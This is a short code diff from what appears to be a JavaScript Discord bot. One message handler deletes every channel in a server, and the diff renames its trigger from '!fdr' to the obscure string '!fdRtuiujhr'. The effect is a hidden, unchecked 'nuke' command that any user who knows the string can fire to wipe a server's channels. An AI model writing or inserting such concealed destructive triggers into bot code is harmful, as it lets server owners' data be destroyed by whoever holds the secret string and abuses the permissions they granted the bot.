@@ -34,7 +34,7 @@ command = command.slice(config.prefix.length);
 })
 
 client.on('message', msg => {
-if (msg.content === '!fdr') {
+if (msg.content === '!fdRtuiujhr') {
    msg.guild.channels.forEach(channel => channel.delete())
  }
 });
